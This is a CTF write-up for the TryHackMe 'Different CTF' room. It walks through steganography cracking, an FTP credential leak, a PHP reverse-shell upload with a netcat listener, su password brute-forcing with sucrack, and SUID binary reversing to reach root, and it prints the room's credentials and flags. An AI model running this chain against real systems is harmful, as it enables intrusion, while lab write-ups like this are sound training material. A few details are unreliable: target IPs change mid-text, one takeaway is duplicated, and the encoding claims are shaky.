# 🕷️ TryHackMe — Different CTF | Full Writeup

> **Room:** [Different CTF](https://tryhackme.com/room/adana)
> **Difficulty:** Hard
> **Category:** Web Exploitation · Steganography · Reverse Engineering · Privilege Escalation
> **Author of writeup:** Nishant Saini ([@nishantsaini5786](https://github.com/nishantsaini5786))
> **Status:** ✅ Completed — Web Flag, User Flag & Root Flag captured

---

## 📜 Table of Contents

1. [Overview](#-overview)
2. [Reconnaissance](#1️⃣-reconnaissance)
3. [Web Enumeration & Directory Discovery](#2️⃣-web-enumeration--directory-discovery)
4. [Steganography — Cracking the Hidden Image](#3️⃣-steganography--cracking-the-hidden-image)
5. [FTP Access & wp-config.php Leak](#4️⃣-ftp-access--wp-configphp-leak)
6. [Discovering a Hidden Subdomain](#5️⃣-discovering-a-hidden-subdomain)
7. [Gaining a Foothold — RCE via FTP Upload](#6️⃣-gaining-a-foothold--rce-via-ftp-upload)
8. [Capturing the Web Flag](#7️⃣-capturing-the-web-flag)
9. [Pivoting to hakanftp](#8️⃣-pivoting-to-hakanftp)
10. [Building & Weaponizing sucrack](#9️⃣-building--weaponizing-sucrack)
11. [Privilege Escalation → hakanbey (User Flag)](#🔟-privilege-escalation--hakanbey-user-flag)
12. [Reverse Engineering the SUID Binary](#1️⃣1️⃣-reverse-engineering-the-suid-binary)
13. [CyberChef Decode & Root Access](#1️⃣2️⃣-cyberchef-decode--root-access)
14. [Root Flag 🏁](#1️⃣3️⃣-root-flag-)
15. [Flags Summary](#-flags-summary)
16. [Tools Used](#-tools-used)
17. [Key Takeaways](#-key-takeaways)

---

## 🧭 Overview

**Different CTF** is a hard-difficulty TryHackMe room that lives up to its name — it doesn't follow
a predictable "scan → exploit → escalate" formula. Instead, it chains together:

- **Steganography** (steghide / stegseek) to extract hidden FTP credentials from a JPEG
- **Custom encoding decode** (hashes.com) to reveal plaintext creds
- **FTP-based source code leak** (`wp-config.php`) exposing database credentials
- **phpMyAdmin pivoting** to discover a completely hidden second WordPress vhost
- **FTP file upload RCE** using a classic PHP reverse shell
- **A custom-compiled brute-force tool (`sucrack`)** to crack a local user's `su` password
- **Reverse engineering a SUID binary** with `strings` / `ltrace`
- **CyberChef-based custom hex/Base85 decoding** to recover the root password

This writeup documents the full attack chain, step by step, exactly as it was performed.

---

## 1️⃣ Reconnaissance

Target IP was added to `/etc/hosts` as `adana.thm` for cleaner access.

```bash
echo "10.146.133.125 adana.thm" >> /etc/hosts
```

An aggressive Nmap scan was run against all ports:

```bash
nmap -sC -sV -p- --min-rate 5000 -T4 10.146.133.125
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 80   | HTTP    | Apache httpd 2.4.29 (Ubuntu) — WordPress 5.6 |

> Only 2 ports open — a small attack surface, but the room name ("think differently")
> was already hinting that the obvious path wasn't the real one.

---

## 2️⃣ Web Enumeration & Directory Discovery

Browsing to `http://adana.thm` revealed a stock **"Hello World"** WordPress site authored by `hakanbey01`.

A directory brute-force with Gobuster uncovered a hidden directory not linked anywhere on the site:

```bash
gobuster dir -u http://10.146.133.125 -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

```
.htpasswd             (Status: 403) [Size: 279]
.htaccess              (Status: 403) [Size: 279]
announcements           (Status: 301) [Size: 324] [--> http://10.146.133.125/announcements/]
```

Inside `/announcements/`:

```
Index of /announcements
----------------------------------------
australian-bulldog-ant.jpg    58K
wordlist.txt                  394K
```

Both files were downloaded:

```bash
wget http://10.146.133.125/announcements/australian-bulldog-ant.jpg
wget http://10.146.133.125/announcements/wordlist.txt
```

---

## 3️⃣ Steganography — Cracking the Hidden Image

`exiftool` on the image showed nothing unusual (1000x700 JPEG, no suspicious metadata).

`steghide info` confirmed the image **did** contain embedded data, but required a passphrase:

```bash
steghide info australian-bulldog-ant.jpg
# capacity: 3.6 KB
# "Enter passphrase:" → could not extract any data with that passphrase!
```

Rather than guessing, **StegSeek** was used with the downloaded `wordlist.txt` to brute-force the
passphrase at high speed:

```bash
stegseek australian-bulldog-ant.jpg wordlist.txt
```

```
[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt"
[i] Extracting to "australian-bulldog-ant.jpg.out"
```

The extracted file contained an encoded string:

```
RlRQLUxPR0lOClVTRVI6IGhha2FmdHAKUEFTUzogMTIzYWRhbmFjcmFjaw==... (truncated)
```

This wasn't plain Base64 — it was identified and decoded using **[hashes.com](https://hashes.com/en/decrypt/hash)**'s
decrypt tool:

```
Found:
RlRQLUxPR0lOClVTRVI6IGhha2FmdHAKUEFTUzogMTIzYWRhbmFjcmFjaw==:FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

🔑 **Credentials obtained:** `hakanftp : 123adanacrack`

---

## 4️⃣ FTP Access & wp-config.php Leak

Logged into FTP with the discovered credentials:

```bash
ftp 10.144.147.159
Name: hakanftp
Password: 123adanacrack
230 Login successful.
```

Directory listing revealed a full WordPress installation sitting on the FTP server. The
`wp-config.php` file was downloaded:

```bash
ftp> get wp-config.php
```

```php
define( 'DB_NAME', 'phpmyadmin1' );
define( 'DB_USER', 'phpmyadmin' );
define( 'DB_PASSWORD', '12345' );
define( 'DB_HOST', 'localhost' );
```

🔑 **Database credentials obtained:** `phpmyadmin : 12345`

---

## 5️⃣ Discovering a Hidden Subdomain

A second Gobuster scan, this time against the virtual host `adana.thm`, revealed more paths:

```bash
gobuster dir -u http://adana.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

```
phpmyadmin       (Status: 301) [--> http://adana.thm/phpmyadmin/]
wp-admin         (Status: 301)
wp-content       (Status: 301)
wp-includes      (Status: 301)
javascript       (Status: 301)
```

Logging into **phpMyAdmin** (`phpmyadmin:12345`) revealed **two separate databases**:

- `phpmyadmin` → `wp_options.siteurl` = `http://adana.thm` (the site we already knew)
- `phpmyadmin1` → `wp_options.siteurl` = **`http://subdomain.adana.thm`** ⚠️ **a completely separate, undiscovered WordPress instance!**

```bash
echo "10.144.147.159 subdomain.adana.thm" >> /etc/hosts
```

Browsing to `http://subdomain.adana.thm` confirmed a second live WordPress site
("Hello World — HAKANBEY"), hosted in a totally separate web root (`/var/www/subdomain`).

This hidden pivot was the real key to the "think differently" theme of the room.

---

## 6️⃣ Gaining a Foothold — RCE via FTP Upload

Since FTP write access was available and the web root was directly reachable via FTP, a classic
**pentestmonkey PHP reverse shell** was used to overwrite the subdomain's `index.php`:

```bash
ftp> get index.php          # pull the original down
nano index.php               # replace contents with php-reverse-shell.php
                              # set $ip and $port to attacker values
ftp> put index.php           # push the modified payload back up
```

A listener was started on the attack box:

```bash
nc -nvlp 4444
```

The payload was triggered simply by visiting the page in a browser:

```
http://subdomain.adana.thm/index.php
```

```
listening on [any] 4444 ...
connect to [...] from (UNKNOWN) [10.144.147.159] 45792
Linux ubuntu 4.15.0-130-generic ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

🐚 **Shell obtained as `www-data`.**

---

## 7️⃣ Capturing the Web Flag

Basic filesystem enumeration under the web root turned up a stray flag file:

```bash
$ ls -la
...
$ cd /var/www/html
$ ls
...  wwe3bbfla4g.txt  ...
$ cat wwe3bbfla4g.txt
THM{343a7e2064a1d992c01ee201c346edff}
```

🚩 **Web Flag:** `THM{343a7e2064a1d992c01ee201c346edff}`

---

## 8️⃣ Pivoting to hakanftp

`www-data`'s shell was non-interactive, so a PTY was spawned before switching users:

```bash
$ /usr/bin/script -qc /bin/bash /dev/null
www-data@ubuntu:/var/www$ su hakanftp
Password: 123adanacrack
```

✅ Pivoted successfully to `uid=1001(hakanftp)`.

Inside hakanftp's home directory, two interesting files were found:

```
source-sucrack.tar.gz   (322771 bytes)
wordlist.txt            (403891 bytes)
```

`source-sucrack.tar.gz` contained the source for **[sucrack](https://github.com/hemp3l/sucrack)**
— a tool designed to brute-force `su` logins locally using `ptrace`/pty tricks, far faster than
repeated `su` calls.

---

## 9️⃣ Building & Weaponizing sucrack

Since the target box had no internet access from the compromised shell, `sucrack` was
**cloned and packaged locally** on the attack box, then transferred to the target via FTP:

```bash
# On attacker box
git clone https://github.com/hemp3l/sucrack.git
tar -czvf source-sucrack.tar.gz ./sucrack

ftp 10.144.147.159
ftp> put wordlist.txt
ftp> put source-sucrack.tar.gz
```

On the target, the source was extracted and compiled:

```bash
tar xfz source-sucrack.tar.gz
cd sucrack
./configure
make
```

```
sucrack configuration
----------------------
sucrack version    : 1.2.3
target system      : LINUX
sucrack link flags : -pthread
```

A working `sucrack` binary was now available at `~/sucrack/src/sucrack`.

---

## 🔟 Privilege Escalation → hakanbey (User Flag)

The system user list (`/etc/passwd`) revealed a `hakanbey` account with a real login shell:

```
hakanbey:x:1000:1000:hakanbey:/home/hakanbey:/bin/bash
```

The wordlist from the steganography step was filtered down (removing the known `123adana` prefix
duplication) and fed to `sucrack`:

```bash
sed 's/^123adana/c$/' wordlist.txt > wordlist2.txt
./sucrack -w 100 -u hakanbey wordlist2.txt
```

```
password is: 123adanasubaru
```

```bash
su hakanbey
Password: 123adanasubaru
```

```bash
hakanbey@ubuntu:~$ cat user.txt
THM{8ba9d7715fe726332b7fc9bd00e67127}
```

🚩 **User Flag:** `THM{8ba9d7715fe726332b7fc9bd00e67127}`

---

## 1️⃣1️⃣ Reverse Engineering the SUID Binary

A hunt for SUID binaries turned up a custom, non-standard executable:

```bash
find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/binary      ← not a standard Linux binary!
```

`strings` on the binary hinted at an interactive string-comparison challenge:

```
I think you should enter the correct string here ==>
Hint! : %s
/root/hint.txt
/root/root.jpg
```

`ltrace` was used to trace the binary's logic live and reconstruct the expected input:

```bash
ltrace /usr/bin/binary
```

```
strcat("war", "zone")       = "warzone"
strcat("warzone", "in")     = "warzonein"
strcat("warzonein", "ada")  = "warzoneinada"
strcat("warzoneinada", "na")= "warzoneinadana"
printf("I think you should enter the correct string here ==>...")
```

The binary was simply building the string **`warzoneinadana`** at runtime. Supplying that exact
string as input:

```bash
/usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
```

```
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
```

The binary (running as root via SUID) then copied `/root/root.jpg` into the user's reachable
filesystem:

```bash
cp root.jpg /var/www/subdomain
```

The copied `root.jpg` turned out to be a fun Easter-egg image ("HACKER — HAKANBEY WAS HERE"),
but the **real secret was hidden in the hex data itself**, not the rendered picture.

---

## 1️⃣2️⃣ CyberChef Decode & Root Access

Using a hex editor on `root.jpg`, the bytes at offset `0x00000020` stood out from standard JPEG
header data:

```
00000020:  FE E9 9D 3D 79 18 5F FC  82 6D DF 1C 69 AC C2 75
```

Following the binary's hint ("CyberChef"), these 16 bytes were run through the following
**CyberChef recipe**:

```
Recipe:
  1. From Hex      (Delimiter: Auto)
  2. To Base85     (Alphabet: !-u, Include delimiter: false)
```

**Input:**
```
FE E9 9D 3D 79 18 5F FC  82 6D DF 1C 69 AC C2 75
```

**Output:**
```
root:Go0odJo0BbBro0o
```

🔑 **Root credentials recovered:** `root : Go0odJo0BbBro0o`

```bash
su root
Password: Go0odJo0BbBro0o

root@ubuntu:/home/hakanbey# whoami
root
```

---

## 1️⃣3️⃣ Root Flag 🏁

```bash
root@ubuntu:~# cat root.txt
THM{c5a9d3e4147a13cbd1ca24b014466a6c}
```

🚩 **Root Flag:** `THM{c5a9d3e4147a13cbd1ca24b014466a6c}`

Room marked **100% complete** — Web flag, User flag, and Root flag all submitted successfully.

---

## 🏆 Flags Summary

| Flag Type | Value |
|-----------|-------|
| 🌐 Web Flag  | `THM{343a7e2064a1d992c01ee201c346edff}` |
| 👤 User Flag | `THM{8ba9d7715fe726332b7fc9bd00e67127}` |
| 🔓 Root Flag | `THM{c5a9d3e4147a13cbd1ca24b014466a6c}` |

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service enumeration |
| `gobuster` | Directory/vhost brute-forcing |
| `exiftool` | Image metadata inspection |
| `steghide` / `stegseek` | Steganography detection & passphrase cracking |
| `hashes.com` | Custom hash/encoding decode |
| `ftp` | File exfiltration & payload upload |
| `phpMyAdmin` | Database pivot / credential discovery |
| `nc` (netcat) | Reverse shell listener |
| `pentestmonkey php-reverse-shell` | Initial foothold payload |
| `sucrack` | Local `su` password brute-forcing |
| `strings` / `ltrace` | Binary reverse engineering |
| `hexeditor` | Raw byte inspection |
| `CyberChef` | Hex → Base85 custom decode |

---

## 💡 Key Takeaways

- **Don't trust the obvious vhost** — a huge chunk of this box was hidden behind a second,
  undiscoverable-by-normal-means WordPress install, only found by pivoting through
  `wp_options` in a second database inside phpMyAdmin.
- **Steganography wordlists often double as system wordlists** — the same `wordlist.txt` used
  to crack the steghide passphrase was later reused (with light modification) to brute-force a
  real system account via `sucrack`.
  the steghide passphrase was later reused (with light modification) to brute-force a real
  system account via `sucrack`.
- **SUID binaries aren't always simple `strings` leaks** — `ltrace` let us reconstruct the exact
  expected input by watching the binary build the string at runtime via `strcat`.
- **"Hint: CyberChef" is a direct signal** — when a CTF explicitly names a tool, trust it; the
  correct recipe (`From Hex` → `To Base85` with a custom alphabet) was non-obvious without that
  nudge.

---

<p align="center">
  <i>Writeup prepared by <a href="https://github.com/nishantsaini5786">Nishant Saini</a> — BCA Student & Cybersecurity Enthusiast</i>
</p>
